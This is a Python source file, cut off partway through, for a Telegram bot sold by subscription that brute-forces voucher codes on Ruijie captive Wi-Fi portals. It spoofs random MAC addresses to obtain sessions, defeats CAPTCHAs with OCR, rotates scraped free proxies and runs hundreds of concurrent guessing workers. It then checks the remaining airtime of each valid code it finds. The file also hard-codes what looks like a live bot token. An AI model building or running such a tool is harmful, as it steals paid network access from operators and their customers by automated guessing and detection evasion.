#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
================================================================================
 ownerfix.py  —  ⚡ RUIJIE ASYNC EXTREME + REPLIT SHIELD ⚡
 Starlink (Ruijie) Voucher Scanner + Telegram Bot   |   Telegram @kyawzin114800
--------------------------------------------------------------------------------
 leeee.py ၏ Speed (Scanner) Logic နှင့် Manual Balance (FAST) ကို ပေါင်းစပ်ထားပါသည်။
 Replit Shield (CPU/RAM/FD watchdog + pattern-rest + purge + rlimit + gc tune)
================================================================================
"""

import asyncio
import aiohttp
import json
import time
import random
import re
import os
import sys
import gc
import ctypes
import hashlib
import datetime
import threading
import traceback
import string
import base64
from http.server import HTTPServer, BaseHTTPRequestHandler
from urllib.parse import urlparse, parse_qs, urlencode, urljoin, urlunparse

import ddddocr
import requests

from telegram import InlineKeyboardButton, InlineKeyboardMarkup, Update, InputFile
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, MessageHandler, filters, ContextTypes
from telegram.constants import ParseMode

try:
    from aiohttp_socks import ProxyConnector
except ImportError:
    ProxyConnector = None

# ═══════════════════════════════════════════════════════════════
#  🎨 DESIGN
# ═══════════════════════════════════════════════════════════════
OWNER = "@kyawzin114800"
BOT_TAGLINE = f"Thank for using By Telegram {OWNER}"
DIV = "━━━━━━━━━━━━━━━━━━━━━━"
CONTACT_LINK = "https://t.me/kyawzin114800"

# ═══════════════════════════════════════════════════════════════
#  🔐 CONFIG
# ═══════════════════════════════════════════════════════════════

BOT_TOKEN = "8810710930:AAHZw-iemtOLK9rBJ6RQpjrrcd-yMaIhvY8"
SYSTEM_KEY = "S3cRetK3y#2024!@#Ruijie"

ADMIN_IDS = [6537847588]

ADMIN_IDS_FILE = "not_admin_ids.json"
KEYS_FILE = "not_keys.json"
USERS_FILE = "not_users.json"
BOT_USERS_FILE = "not_bot_users.json"

DURATION_MAP = {
    "1h": (3600, "1 Hour"), "2h": (7200, "2 Hours"),
    "6h": (21600, "6 Hours"), "12h": (43200, "12 Hours"),
    "1d": (86400, "1 Day"), "2d": (172800, "2 Days"),
    "3d": (259200, "3 Days"), "5d": (432000, "5 Days"),
    "7d": (604800, "7 Days"), "10d": (864000, "10 Days"),
    "15d": (1296000, "15 Days"), "30d": (2592000, "30 Days"),
    "1y": (31536000, "1 Year"),
}

MM_TZ = datetime.timezone(datetime.timedelta(hours=6, minutes=30))
def now_mm(): return datetime.datetime.now(MM_TZ)


def get_token():
    return BOT_TOKEN.strip()


def load_config():
    if not SYSTEM_KEY or not ADMIN_IDS:
        print("❌ SYSTEM_KEY သို့မဟုတ် ADMIN_IDS မထည့်ထားပါ")
        sys.exit(1)
    return


# ═══════════════════════════════════════════════════════════════
#  🛡️  REPLIT SHIELD (from mix6.py — CPU/RAM/FD watchdog)
# ═══════════════════════════════════════════════════════════════
CPU_PAUSE_THRESHOLD = 86.0
CPU_RESUME_THRESHOLD = 62.0
MEM_PAUSE_THRESHOLD = 80.0
MEM_RESUME_THRESHOLD = 60.0
RSS_HARD_MB = 1100
RSS_SOFT_MB = 850
FD_HARD = 1800
FD_SOFT = 1200
WATCHDOG_INTERVAL = 3.0
COOLDOWN_MIN = 3.0
COOLDOWN_MAX = 3.0
VERIFY_TRIES = 6
VERIFY_DELAY = 0.5
GC_THRESH_0, GC_THRESH_1, GC_THRESH_2 = 350, 9, 9
PERIODIC_PURGE_SEC = 120.0

# ── pattern-rest ──
PATTERN_BREAK_MIN = 3.0
PATTERN_BREAK_MAX = 3.0
PATTERN_BREAK_INTERVAL_MIN = 180.0
PATTERN_BREAK_INTERVAL_MAX = 360.0

_cpu_paused = False
_shutdown_flag = False
_last_pattern_break = time.time()
_next_pattern_break = time.time() + random.uniform(
    PATTERN_BREAK_INTERVAL_MIN, PATTERN_BREAK_INTERVAL_MAX)


def _get_fd_count():
    try:
        return len(os.listdir('/proc/self/fd'))
    except Exception:
        return 0


def _apply_replit_limits():
    try:
        import resource
        try:
            resource.setrlimit(resource.RLIMIT_CPU, (7200, 10800))
        except Exception:
            pass
        try:
            resource.setrlimit(resource.RLIMIT_FSIZE, (50 * 1024 * 1024, 50 * 1024 * 1024))
        except Exception:
            pass
    except Exception:
        pass


def _tune_gc():
    try:
        gc.set_threshold(GC_THRESH_0, GC_THRESH_1, GC_THRESH_2)
        gc.collect()
    except Exception:
        pass


class ResourceWatchdog:
    def __init__(self, user_id):
        self.user_id = user_id
        self.running = False
        self._proc = None
        self._last_periodic_purge = time.time()

    def _cpu(self):
        try:
            import psutil
            if self._proc is None:
                self._proc = psutil.Process(os.getpid())
            return self._proc.cpu_percent(interval=0.3)
        except Exception:
            pass
        try:
            la = os.getloadavg()[0]
            n = os.cpu_count() or 1
            return min(100.0, (la / n) * 100.0)
        except Exception:
            return 0.0

    def _mem_pct(self):
        try:
            import psutil
            if self._proc is None:
                self._proc = psutil.Process(os.getpid())
            return self._proc.memory_percent()
        except Exception:
            return 0.0

    def _rss_mb(self):
        try:
            import psutil
            if self._proc is None:
                self._proc = psutil.Process(os.getpid())
            return self._proc.memory_info().rss / (1024 * 1024)
        except Exception:
            pass
        try:
            with open('/proc/self/status') as f:
                for line in f:
                    if line.startswith('VmRSS:'):
                        return int(line.split()[1]) / 1024.0
        except Exception:
            pass
        return 0.0

    @staticmethod
    def _trim_heap():
        gc.collect()
        try:
            libc = ctypes.CDLL('libc.so.6')
            libc.malloc_trim(0)
        except Exception:
            pass

    async def _purge_caches(self):
        ud = get_user_data(self.user_id)
        tc = ud.get('tried_codes', set())
        if len(tc) > 2_000_000:
            ud['tried_codes'] = set(list(tc)[-800_000:])
        elif len(tc) > 800_000:
            ud['tried_codes'] = set(list(tc)[-300_000:])

        lc = ud.get('limit_codes', [])
        if len(lc) > 4000:
            ud['limit_codes'] = lc[-1500:]

        rl = ud.get('recent_logs', [])
        if len(rl) > 25:
            ud['recent_logs'] = rl[-15:]

        self._trim_heap()
        gc.collect()

    def _breach(self, cpu, mem, rss, fd):
        return (cpu >= CPU_PAUSE_THRESHOLD
                or mem >= MEM_PAUSE_THRESHOLD
                or rss >= RSS_HARD_MB
                or fd >= FD_HARD)

    def _recovered(self, cpu, mem, rss, fd):
        return (cpu < CPU_RESUME_THRESHOLD
                and mem < MEM_RESUME_THRESHOLD
                and rss < RSS_SOFT_MB
                and fd < FD_SOFT)

    async def loop(self):
        global _cpu_paused, _last_pattern_break, _next_pattern_break
        self.running = True
        try:
            import psutil
            self._proc = psutil.Process(os.getpid())
            self._proc.cpu_percent(interval=None)
        except Exception:
            pass

        while self.running:
            try:
                await asyncio.sleep(WATCHDOG_INTERVAL)
                ud = get_user_data(self.user_id)
                if ud['stop_event'].is_set():
                    return

                cpu = self._cpu()
                mem = self._mem_pct()
                rss = self._rss_mb()
                fd = _get_fd_count()

                if fd >= FD_HARD and not _cpu_paused:
                    self._trim_heap()
                    await asyncio.sleep(random.uniform(2.0, 4.0))
                elif fd >= FD_SOFT:
                    gc.collect()

                if self._breach(cpu, mem, rss, fd) and not _cpu_paused:
                    _cpu_paused = True
                    pause_sec = random.uniform(COOLDOWN_MIN, COOLDOWN_MAX)
                    ud['recent_logs'].append(f'🛡️ shielding {pause_sec:.0f}s')
                    ud['dash_update_event'].set()

                    await self._purge_caches()
                    self._trim_heap()
                    await asyncio.sleep(pause_sec)

                    for _ in range(VERIFY_TRIES):
                        if ud['stop_event'].is_set():
                            return
                        cpu = self._cpu()
                        mem = self._mem_pct()
                        rss = self._rss_mb()
                        fd = _get_fd_count()
                        if self._recovered(cpu, mem, rss, fd):
                            break
                        await asyncio.sleep(VERIFY_DELAY)

                    _cpu_paused = False
                    ud['recent_logs'].append('▶️ resumed')
                    ud['dash_update_event'].set()

                now = time.time()
                if now >= _next_pattern_break and not _cpu_paused:
                    rest = random.uniform(PATTERN_BREAK_MIN, PATTERN_BREAK_MAX)
                    _cpu_paused = True
                    ud['recent_logs'].append(f'🛡️ {rest:.0f}s')
                    ud['dash_update_event'].set()
                    await asyncio.sleep(rest)
                    _cpu_paused = False
                    _last_pattern_break = time.time()
                    _next_pattern_break = time.time() + random.uniform(
                        PATTERN_BREAK_INTERVAL_MIN, PATTERN_BREAK_INTERVAL_MAX)
                    ud['recent_logs'].append('▶️ resumed')
                    ud['dash_update_event'].set()

                now = time.time()
                if now - self._last_periodic_purge > PERIODIC_PURGE_SEC:
                    await self._purge_caches()
                    self._last_periodic_purge = now

            except asyncio.CancelledError:
                return
            except Exception:
                await asyncio.sleep(WATCHDOG_INTERVAL)

    def stop(self):
        self.running = False


_watchdog = None


def get_watchdog(user_id):
    global _watchdog
    if _watchdog is None:
        _watchdog = ResourceWatchdog(user_id)
    return _watchdog


# ═══════════════════════════════════════════════════════════════
#  📁 JSON
# ═══════════════════════════════════════════════════════════════
def _load_json(path: str) -> dict:
    try:
        if not os.path.exists(path): return {}
        with open(path, "r", encoding="utf-8") as f: return json.load(f)
    except Exception: return {}


def _save_json(path: str, data: dict) -> None:
    try:
        tmp = path + ".tmp"
        with open(tmp, "w", encoding="utf-8") as f:
            json.dump(data, f, indent=2, ensure_ascii=False)
        os.replace(tmp, path)
    except Exception as e:
        print(f"[JSON] {path}: {e}")


def _load_json_list(path: str) -> list:
    try:
        if not os.path.exists(path): return []
        with open(path, "r", encoding="utf-8") as f:
            data = json.load(f)
            return data if isinstance(data, list) else []
    except Exception: return []


def _save_json_list(path: str, data: list) -> None:
    try:
        tmp = path + ".tmp"
        with open(tmp, "w", encoding="utf-8") as f:
            json.dump(data, f, indent=2, ensure_ascii=False)
        os.replace(tmp, path)
    except Exception as e:
        print(f"[JSON] {path}: {e}")


def load_keys() -> dict: return _load_json(KEYS_FILE)
def save_keys(data: dict) -> None: _save_json(KEYS_FILE, data)
def load_users() -> dict: return _load_json(USERS_FILE)
def save_users(data: dict) -> None: _save_json(USERS_FILE, data)
def load_bot_users() -> dict: return _load_json(BOT_USERS_FILE)
def save_bot_users(data: dict) -> None: _save_json(BOT_USERS_FILE, data)


def track_bot_user(user) -> None:
    try:
        bot_users = load_bot_users()
        uid = str(user.id)
        info = bot_users.get(uid, {})
        info["id"] = user.id
        info["username"] = user.username or ""
        info["first_name"] = user.first_name or ""
        info["last_name"] = user.last_name or ""
        info["first_seen"] = info.get("first_seen", time.time())
        info["last_seen"] = time.time()
        info["seen_count"] = info.get("seen_count", 0) + 1
        bot_users[uid] = info
        save_bot_users(bot_users)
    except Exception: pass


# ═══════════════════════════════════════════════════════════════
#  🧹 CLEAR ALL
# ═══════════════════════════════════════════════════════════════
def clear_all_data() -> dict:
    result = {"keys": 0, "users": 0, "bot_users": 0}
    try:
        keys = load_keys()
        result["keys"] = len(keys)
        save_keys({})

        users = load_users()
        result["users"] = len(users)
        save_users({})

        bot_users = load_bot_users()
        result["bot_users"] = len(bot_users)
        save_bot_users({})
    except Exception as e:
        print(f"[ClearAll] Error: {e}")
    return result


# ═══════════════════════════════════════════════════════════════
#  👑 ADMIN
# ═══════════════════════════════════════════════════════════════
def load_admin_ids() -> list:
    result = set(ADMIN_IDS)
    try:
        for x in _load_json_list(ADMIN_IDS_FILE):
            try: result.add(int(x))
            except (ValueError, TypeError): pass
    except Exception: pass
    return list(result)


def save_admin_ids(ids: list) -> None:
    try: _save_json_list(ADMIN_IDS_FILE, [int(x) for x in ids])
    except Exception: pass


def is_admin(user_id: int) -> bool:
    return user_id in load_admin_ids()


def add_admin_id(user_id: int) -> bool:
    try:
        ids = load_admin_ids()
        if user_id in ids: return False
        ids.append(int(user_id)); save_admin_ids(ids)
        return True
    except Exception: return False


def remove_admin_id(user_id: int) -> bool:
    try:
        ids = load_admin_ids()
        if user_id not in ids: return False
        ids.remove(int(user_id)); save_admin_ids(ids)
        return True
    except Exception: return False


# ═══════════════════════════════════════════════════════════════
#  🔐 ACCESS
# ═══════════════════════════════════════════════════════════════
def check_user_access(user_id: int) -> tuple:
    if is_admin(user_id): return True, "Admin"
    users = load_users()
    uinfo = users.get(str(user_id))
    if not uinfo: return False, "No access"
    expiry = uinfo.get("expires_at", 0)
    if expiry == 0: return True, "Unlimited"
    if time.time() > expiry: return False, "Expired"
    remaining = int(expiry - time.time())
    days = remaining // 86400
    hours = (remaining % 86400) // 3600
    mins = (remaining % 3600) // 60
    return True, f"{days}d {hours}h {mins}m"


def format_expiry_mm(expiry_ts: int) -> str:
    if expiry_ts == 0: return "♾ Unlimited"
    dt = datetime.datetime.fromtimestamp(expiry_ts, tz=MM_TZ)
    return dt.strftime("%Y-%m-%d %I:%M %p")


def generate_unique_key(existing_keys: dict) -> str:
    for _ in range(100):
        raw = ''.join(random.choices(string.ascii_uppercase + string.digits, k=16))
        key = '-'.join(raw[i:i+4] for i in range(0, 16, 4))
        if key not in existing_keys: return key
    return '-'.join(''.join(random.choices(string.ascii_uppercase + string.digits, k=4)) for _ in range(4))


# ═══════════════════════════════════════════════════════════════
#  🎨 TERMINAL
# ═══════════════════════════════════════════════════════════════
RESET = "\033[0m"; CYAN = "\033[96m"; MAGENTA = "\033[95m"
GREEN = "\033[92m"; YELLOW = "\033[93m"; RED = "\033[91m"; BOLD = "\033[1m"
LAST_RUN_FILE = "not_last_run.txt"

def show_banner():
    try:
        os.system("clear" if os.name == "posix" else "cls")
    except Exception:
        pass
    print(f"{CYAN}{BOLD}")
    print("⚡════════════════════════════════════════⚡")
    print(f"{MAGENTA}     ⚡  STARLINK SCANNER  ⚡")
    print(f"{YELLOW}      By Telegram {OWNER}")
    print(f"{MAGENTA}   {BOT_TAGLINE}")
    print(f"{CYAN}⚡════════════════════════════════════════⚡{RESET}")


def check_time():
    now = datetime.datetime.now()
    if os.path.exists(LAST_RUN_FILE):
        try:
            with open(LAST_RUN_FILE) as f:
                last = datetime.datetime.strptime(f.read().strip(), "%Y-%m-%d %H:%M:%S")
            if now < last:
                print(f"\n{RED}[!] TIME ROLLBACK DETECTED{RESET}")
                os._exit(0)
        except Exception:
            pass
    try:
        with open(LAST_RUN_FILE, "w") as f:
            f.write(now.strftime("%Y-%m-%d %H:%M:%S"))
    except Exception:
        pass


def check_approval():
    check_time()
    show_banner()
    if not SYSTEM_KEY or not SYSTEM_KEY.strip():
        print(f"{RED}NO KEY SET{RESET}")
        os._exit(0)
    expiry = datetime.datetime.strptime("2099-12-31 23:59:59", "%Y-%m-%d %H:%M:%S")
    remaining = expiry - datetime.datetime.now()
    d = remaining.days
    h, rem = divmod(remaining.seconds, 3600)
    m, _ = divmod(rem, 60)
    print(f"{GREEN}  🔐 Key       ➜ ✅ Authorized{RESET}")
    print(f"{YELLOW}  ⏰ Expires   ➜ {expiry.strftime('%Y-%m-%d %H:%M')}{RESET}")
    print(f"{CYAN}  💎 Time left ➜ {d}d {h}h {m}m{RESET}")
    print(f"{CYAN}⚡════════════════════════════════════════⚡{RESET}")
    print(f"{MAGENTA}  🛡️ Replit Shield ▸ CPU@{CPU_PAUSE_THRESHOLD}% MEM@{MEM_PAUSE_THRESHOLD}% RSS@{RSS_HARD_MB}MB FD@{FD_HARD}{RESET}")
    time.sleep(1.0)


# ═══════════════════════════════════════════════════════════════
#  🌐 WEB SERVER
# ═══════════════════════════════════════════════════════════════
def run_web():
    port = int(os.environ.get("PORT", 8080))

    class H(BaseHTTPRequestHandler):
        def do_GET(self):
            self.send_response(200)
            self.send_header("Content-type", "text/plain")
            self.end_headers()
            self.wfile.write(b"Bot is alive")

        def log_message(self, *a):
            pass

    try:
        HTTPServer(("0.0.0.0", port), H).serve_forever()
    except Exception as e:
        print(f"[WebServer] {e}")


def start_web():
    threading.Thread(target=run_web, daemon=True).start()


# ═══════════════════════════════════════════════════════════════
#  ⚙️ CONFIG
# ═══════════════════════════════════════════════════════════════
TIMEOUT_SEC = 20
MAX_CODES_PER_SID = 60
MAX_CODES_PER_SESSION = 60
NUM_WORKERS = 300
MIN_WORKERS = 50
MAX_WORKERS = 1000
MANUAL_CONCURRENCY = 15
RETRY_CONCURRENCY = 30
BALANCE_WORKERS = 30

PORTAL_URL_PATH = "portal_url_"
PROXY_FILE = "proxies.txt"

# ★★★ အကောင်းဆုံး Proxy API လင့်ခ်များ (အသစ်ဆုံး) ★★★
PROXY_SOURCES = [
    "https://cdn.jsdelivr.net/gh/proxifly/free-proxy-list@main/proxies/protocols/http/data.txt",
    "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt",
    "https://api.proxyscrape.com/v4/free-proxy-list/get?request=display_proxies&proxy_format=protocolipport&format=text&protocol=http",
    "https://proxylist.geonode.com/api/proxy-list?protocols=http&page=1&limit=500&sort_by=responseTime&sort_type=asc",
    "https://raw.githubusercontent.com/proxmint/free-proxy-list/main/http.txt",
]


# ═══════════════════════════════════════════════════════════════
#  🕷️ PROXY MANAGER
# ═══════════════════════════════════════════════════════════════
class ProxyManager:
    def __init__(self, file_path):
        self.file_path = file_path
        self.proxies = []
        self.bad_proxies = set()
        self.good_proxies = []
        self.index = 0
        self.good_index = 0
        self.lock = asyncio.Lock()
        self.load()

    def _normalize(self, proxy):
        proxy = proxy.strip()
        if not proxy:
            return None
        # Port မပါရင် လုံးဝ လက်မခံတော့ဘူး
        if ":" not in proxy:
            return None
        if not proxy.startswith(("http://", "https://", "socks4://", "socks5://")):
            proxy = "http://" + proxy
        return proxy

    def load(self):
        if os.path.exists(self.file_path):
            try:
                with open(self.file_path) as f:
                    raw = [line.strip() for line in f if line.strip()]
                self.proxies = [p for p in (self._normalize(r) for r in raw) if p]
            except Exception as e:
                print(f"[ProxyManager] Load error: {e}")
                self.proxies = []
        else:
            self.proxies = []
        self.bad_proxies.clear()
        self.index = 0
        print(f"[ProxyManager] Loaded {len(self.proxies)} proxies")

    def reload(self):
        self.load()

    def clear_file(self):
        try:
            with open(self.file_path, "w") as f:
                f.write("")
        except Exception:
            pass
        self.proxies = []
        self.bad_proxies.clear()
        self.good_proxies.clear()
        self.index = 0

    def add_proxies(self, new_proxies):
        normalized = [self._normalize(p) for p in new_proxies if p.strip()]
        normalized = [p for p in normalized if p]
        existing = set(self.proxies)
        added = []
        for p in normalized:
            if p not in existing:
                added.append(p)
                existing.add(p)
        if added:
            try:
                with open(self.file_path, "a") as f:
                    for p in added:
                        f.write(p + "\n")
            except Exception as e:
                print(f"[ProxyManager] Append error: {e}")
        self.reload()
        return len(added)

    def mark_good(self, proxy):
        if proxy and proxy not in self.good_proxies:
            self.good_proxies.append(proxy)

    async def get_next(self):
        async with self.lock:
            if not self.proxies:
                return None
            if self.good_proxies and random.random() < 0.8:
                proxy = self.good_proxies[self.good_index % len(self.good_proxies)]
                self.good_index += 1
                return proxy
            available = [p for p in self.proxies if p not in self.bad_proxies]
            if not available:
                self.bad_proxies.clear()
                available = self.proxies[:]
            proxy = available[self.index % len(available)]
            self.index += 1
            return proxy

    async def get_random(self):
        async with self.lock:
            if not self.proxies:
                return None
            available = [p for p in self.proxies if p not in self.bad_proxies]
            if not available:
                self.bad_proxies.clear()
                available = self.proxies[:]
            return random.choice(available) if available else None

    async def mark_bad(self, proxy):
        if not proxy:
            return
        async with self.lock:
            self.bad_proxies.add(proxy)
            if proxy in self.good_proxies:
                try:
                    self.good_proxies.remove(proxy)
                except ValueError:
                    pass

    def stats(self):
        total = len(self.proxies)
        bad = len(self.bad_proxies)
        return total, total - bad


_pm = None


def get_proxy_manager():
    global _pm
    if _pm is None:
        _pm = ProxyManager(PROXY_FILE)
    return _pm


def create_connector_for_proxy(proxy):
    if proxy and ProxyConnector is not None:
        # ★★★ Port မပါရင် Error မတက်အောင် ကာကွယ်ခြင်း ★★★
        try:
            if ":" not in proxy.split("//")[-1]:
                return None
            return ProxyConnector.from_url(proxy, ssl=False)
        except Exception:
            return None
    return None


# ═══════════════════════════════════════════════════════════════
#  🔍 OCR
# ═══════════════════════════════════════════════════════════════
_ocr_instance = None
_ocr_lock = threading.Lock()


def get_ocr_instance():
    global _ocr_instance
    if _ocr_instance is None:
        with _ocr_lock:
            if _ocr_instance is None:
                _ocr_instance = ddddocr.DdddOcr(show_ad=False)
    return _ocr_instance


# ═══════════════════════════════════════════════════════════════
#  👤 USER DATA
# ═══════════════════════════════════════════════════════════════
user_scanners = {}
user_proxy_checks = {}
user_manual_balance = {}


def get_user_data(user_id):
    if user_id not in user_scanners:
        saved_url = None
        p_file = f"{PORTAL_URL_PATH}{user_id}.txt"
        if os.path.exists(p_file):
            try:
                with open(p_file) as f:
                    saved_url = f.read().strip()
            except Exception:
                saved_url = None

        user_scanners[user_id] = {
            "mode": "num6",
            "char_set": "012345678",
            "code_len": 6,
            "start_digit": None,
            "portal_url": saved_url,
            "stop_event": asyncio.Event(),
            "dash_update_event": asyncio.Event(),
            "task": None,
            "stats": {"tried": 0, "hits": 0, "expired": 0, "limits": 0, "start_time": time.time()},
            "valid_codes": [],
            "limit_codes": [],
            "tried_codes": set(),
            "recent_logs": [],
            "CURRENT_CODE": "----",
            "dash_msg_id": None,
            "menu_msg_id": None,
            "state": None,
            "num_workers": NUM_WORKERS,
            "balance_queue": asyncio.Queue(),
            "last_tried": 0,
            "last_time": time.time(),
        }
    return user_scanners[user_id]


# ═══════════════════════════════════════════════════════════════
#  🔧 UTILITIES
# ═══════════════════════════════════════════════════════════════
def generate_random_mac():
    return ":".join(["%02x" % random.randint(0, 255) for _ in range(6)])


def ocr_image_bytes_fast(image_bytes):
    try:
        ocr = get_ocr_instance()
        result = ocr.classification(image_bytes)
        return result.strip().upper()
    except Exception:
        return ""


async def solve_captcha_simple_async(session, captcha_url, headers):
    try:
        current_url = f"{captcha_url}&_t={int(time.time() * 1000)}"
        async with session.get(current_url, headers=headers, ssl=False, timeout=5) as response:
            if response.status == 200:
                image_content = await response.read()
                return await asyncio.to_thread(ocr_image_bytes_fast, image_content)
    except Exception:
        pass
    return None


async def get_sid_from_gateway(session, portal_url, user_id):
    ud = get_user_data(user_id)
    if ud["stop_event"].is_set():
        return None, None
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
    }
    try:
        u = urlparse(portal_url)
        query = parse_qs(u.query)
        mac = generate_random_mac()
        query["mac"] = [mac]
        spoofed_url = urlunparse(u._replace(query=urlencode(query, doseq=True)))

        async with session.get(spoofed_url, headers=headers, timeout=10, ssl=False) as r2:
            body = await r2.text()
            match = re.search(r"location\.href\s*=\s*['\"]([^'\"]+)['\"]", body)
            if match:
                final_url = urljoin(spoofed_url, match.group(1))
                async with session.get(final_url, headers=headers, timeout=10, ssl=False) as r3:
                    final_url = str(r3.url)
            else:
                final_url = str(r2.url)
            parsed_query = parse_qs(urlparse(final_url).query)
            sid = parsed_query.get("sessionId", parsed_query.get("sid", [None]))[0]
            if sid:
                return sid, mac
    except Exception:
        pass
    return None, None


# ═══════════════════════════════════════════════════════════════
#  💰 BALANCE
# ═══════════════════════════════════════════════════════════════
async def fetch_balance_with_proxy(active_token, proxy, timeout=3):
    url = f"https://portal-as.ruijienetworks.com/api/auth/balance/getBalance/{active_token}"
    headers = {
        "authority": "portal-as.ruijienetworks.com",
        "accept": "application/json, text/javascript, */*; q=0.01",
        "accept-language": "en-US,en;q=0.9",
        "content-type": "application/json;",
        "referer": f"https://portal-as.ruijienetworks.com/download/static/maccauth/src/balance.html?sessionId={active_token}&lang=en_US",
        "user-agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36",
        "x-requested-with": "XMLHttpRequest",
    }
    try:
        connector = create_connector_for_proxy(proxy)
        async with aiohttp.ClientSession(connector=connector) as s:
            async with s.get(url, headers=headers, timeout=timeout) as resp:
                if resp.status == 200:
                    data = await resp.json()
                    inner = data.get("result", data)
                    if not isinstance(inner, dict):
                        return False, f"unexpected format"
                    profile_name = inner.get("profileName", "N/A")
                    raw_total = inner.get("totalMinutes", 0)
                    try:
                        total_minutes = abs(int(raw_total))
                    except Exception:
                        total_minutes = 0
                    hours = total_minutes // 60
                    minutes = total_minutes % 60
                    return True, f"🃏: {profile_name}, ⏰: {hours} hr {minutes} min"
                else:
                    return False, f"HTTP {resp.status}"
    except Exception as e:
        return False, f"{type(e).__name__}"
    return False, "unknown"


async def fetch_balance_direct(active_token, timeout=5):
    url = f"https://portal-as.ruijienetworks.com/api/auth/balance/getBalance/{active_token}"
    headers = {
        "authority": "portal-as.ruijienetworks.com",
        "accept": "application/json, text/javascript, */*; q=0.01",
        "accept-language": "en-US,en;q=0.9",
        "content-type": "application/json;",
        "referer": f"https://portal-as.ruijienetworks.com/download/static/maccauth/src/balance.html?sessionId={active_token}&lang=en_US",
        "user-agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36",
        "x-requested-with": "XMLHttpRequest",
    }
    try:
        async with aiohttp.ClientSession() as s:
            async with s.get(url, headers=headers, timeout=timeout, ssl=False) as resp:
                if resp.status == 200:
                    data = await resp.json()
                    inner = data.get("result", data)
                    if not isinstance(inner, dict):
                        return False, f"unexpected format"
                    profile_name = inner.get("profileName", "N/A")
                    raw_total = inner.get("totalMinutes", 0)
                    try:
                        total_minutes = abs(int(raw_total))
                    except Exception:
                        total_minutes = 0
                    hours = total_minutes // 60
                    minutes = total_minutes % 60
                    return True, f"🃏: {profile_name}, ⏰: {hours} hr {minutes} min"
                else:
                    return False, f"HTTP {resp.status}"
    except Exception as e:
        return False, f"Net/Other: {type(e).__name__}"
    return False, "unknown"


async def fetch_balance_fast(active_token, preferred_proxy=None):
    pm = get_proxy_manager()

    if preferred_proxy:
        ok, result = await fetch_balance_with_proxy(active_token, preferred_proxy, timeout=3)
        if ok:
            pm.mark_good(preferred_proxy)
            return (result, "proxy")
        if result in ("ClientConnectorError", "ServerTimeoutError",
                      "ClientOSError", "ConnectionResetError",
                      "TimeoutError", "ClientProxyConnectionError",
                      "ServerDisconnectedError", "ClientConnectionError"):
            await pm.mark_bad(preferred_proxy)

    if pm.good_proxies:
        for proxy in random.sample(pm.good_proxies, min(1, len(pm.good_proxies))):
            if proxy == preferred_proxy:
                continue
            ok, result = await fetch_balance_with_proxy(active_token, proxy, timeout=3)
            if ok:
                pm.mark_good(proxy)
                return (result, "proxy")
            if result in ("ClientConnectorError", "ServerTimeoutError",
                          "ClientOSError", "ConnectionResetError",
                          "TimeoutError", "ClientProxyConnectionError"):
                await pm.mark_bad(proxy)

    ok, result = await fetch_balance_direct(active_token, timeout=5)
    return (result if ok else f"❌ {result}", "direct")


# ═══════════════════════════════════════════════════════════════
#  💰 BALANCE WORKER
# ═══════════════════════════════════════════════════════════════
async def balance_worker(user_id, worker_id):
    ud = get_user_data(user_id)
    while not ud["stop_event"].is_set():
        try:
            try:
                active_token, code, proxy_str = await asyncio.wait_for(
                    ud["balance_queue"].get(), timeout=1.0
                )
            except asyncio.TimeoutError:
                continue

            if ud["stop_event"].is_set():
                break

            try:
                balance_str, source = await fetch_balance_fast(active_token, preferred_proxy=proxy_str)
            except Exception as e:
                balance_str = f"❌ {type(e).__name__}"
                source = "❌"

            for item in ud["valid_codes"]:
                if item["code"] == code:
                    item["balance_str"] = balance_str
                    item["source"] = source
                    break
            ud["dash_update_event"].set()
            ud["balance_queue"].task_done()
        except asyncio.CancelledError:
            break
        except Exception:
            await asyncio.sleep(0.1)


# ═══════════════════════════════════════════════════════════════
#  ✅ CHECK SINGLE CODE
# ═══════════════════════════════════════════════════════════════
async def check_single_access_code(session, code, current_session_id, login_url,
                                   captcha_base_url, verify_url, headers, user_id, current_proxy):
    ud = get_user_data(user_id)
    if ud["stop_event"].is_set():
        return "failed"

    if _cpu_paused:
        await asyncio.sleep(0.15)
        return "failed"

    captcha_url = f"{captcha_base_url}?sessionId={current_session_id}"
    for _ in range(2):
        if ud["stop_event"].is_set():
            return "failed"
        auth_code = await solve_captcha_simple_async(session, captcha_url, headers)
        if not auth_code or len(auth_code) < 2:
            continue
        v_payload = {"sessionId": current_session_id, "authCode": auth_code}
        try:
            async with session.post(verify_url, json=v_payload, headers=headers, ssl=False, timeout=8) as v_resp:
                if v_resp.status != 200:
                    continue
                v_data = await v_resp.json()
                if not v_data.get("success"):
                    continue
                l_payload = {"accessCode": code, "sessionId": current_session_id, "apiVersion": 1, "authCode": auth_code}
                async with session.post(login_url, json=l_payload, headers=headers, ssl=False, timeout=10) as l_resp:
                    ud["stats"]["tried"] += 1
                    l_text = (await l_resp.text()).lower()
                    if "request limited" in l_text:
                        return "limit"
                    if '"success":true' in l_text:
                        ud["stats"]["hits"] += 1
                        pm = get_proxy_manager()
                        pm.mark_good(current_proxy)
                        token_match = re.search(r'token=([^&\s"\'<>]+)', l_text)
                        active_token = token_match.group(1) if token_match else None
                        entry = {
                            "code": code,
                            "balance_str": "...fetching...",
                            "source": "...",
                            "active_token": active_token,
                        }
                        if not any(item["code"] == code for item in ud["valid_codes"]):
                            ud["valid_codes"].append(entry)
                        ud["dash_update_event"].set()
                        if active_token:
                            await ud["balance_queue"].put((active_token, code, current_proxy))
                        else:
                            entry["balance_str"] = "❌ no token"
                            entry["source"] = "❌"
                            ud["dash_update_event"].set()
                        return "hit"
                    elif "expired" in l_text:
                        ud["stats"]["expired"] += 1
                        return "expired"
                    elif "the number of sta exceeds the limit" in l_text or "limit" in l_text:
                        ud["stats"]["limits"] += 1
                        if code not in ud["limit_codes"]:
                            ud["limit_codes"].append(code)
                        ud["recent_logs"].append(f"⚠️ LIMIT: {code}")
                        return "limit"
                    return "failed"
        except Exception:
            return "failed"
    return "failed"


# ═══════════════════════════════════════════════════════════════
#  👷 WORKER
# ═══════════════════════════════════════════════════════════════
async def worker(worker_id, login_url, captcha_base_url, verify_url, headers, user_id):
